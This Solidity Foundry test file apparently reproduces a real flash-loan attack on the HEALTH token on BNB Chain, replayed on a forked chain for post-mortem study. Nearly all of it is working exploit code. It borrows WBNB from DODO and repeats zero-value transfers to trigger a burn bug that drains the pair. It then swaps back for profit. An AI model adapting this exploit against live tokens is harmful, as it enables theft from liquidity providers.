// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~16.64 BNB
// Attacker : 0xDE78112FF006f166E4ccfe1dfE4181C9619D3b5D
// Attack Contract : 0x80e5FC0d72e4814cb52C16A18c2F2B87eF1Ea2d4
// Vulnerable Contract : 0x32B166e082993Af6598a89397E82e123ca44e74E
// Attack Tx : https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x32B166e082993Af6598a89397E82e123ca44e74E#code#L799

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1583073442433495040

contract ContractTest is Test {
    IERC20 constant HEALTH_TOKEN = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V2 constant WBNB_HEALTH_PAIR = Uni_Pair_V2(0xF375709DbdE84D800642168c2e8bA751368e8D32);
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO_DVM = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    function setUp() public {
        vm.createSelectFork("bsc", 22_337_425);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(address(HEALTH_TOKEN), "HEALTH");
        vm.label(address(WBNB_HEALTH_PAIR), "WBNB_HEALTH_PAIR");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(DODO_DVM, "DODO_DVM");
        vm.label(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, "BUSD");
        vm.label(0x64d868F307263f8566172fc42D75Ea03A5690271, "HEALTH_DEV_ADDRESS");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );

        // Approving PancakeSwap router to spend attacker's WBNB and HEALTH
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        HEALTH_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // Requesting 40 WBNB via flashloan from DODO DVM. Payload is in the callback (DPPFlashLoanCall).
        DVM(DODO_DVM).flashLoan(40 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );
    }

    /*
     * Callback function called by DODO DVM during the flashloan
     */
    function DPPFlashLoanCall(
        address, /*sender*/
        uint256, /*baseAmount*/
        uint256, /*quoteAmount*/
        bytes calldata /*data*/
    ) external {
        // Swap all WBNB to HEALTH
        _WBNBToHEALTH();

        // Actual payload exploiting the vulnerability in `_transfer()` function
        // This will make the `_transfer()` function burn a lot of HEALTH tokens
        // from the pair, so increase its price in relation to WBNB
        for (uint256 i = 0; i < 1000; i++) {
            HEALTH_TOKEN.transfer(address(this), 0);
        }

        // Swap all HEALTH to WBNB to repay the flashloan and keep the profit
        _HEALTHToWBNB();

        // Returning only the 40 flashloaned WBNB
        WBNB_TOKEN.transfer(DODO_DVM, 40 * 1e18);
    }

    /**
     * Auxiliary function to swap all WBNB to HEALTH
     */
    function _WBNBToHEALTH() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(HEALTH_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    /**
     * Auxiliary function to swap all HEALTH to WBNB
     */
    function _HEALTHToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HEALTH_TOKEN);
        path[1] = address(WBNB_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HEALTH_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
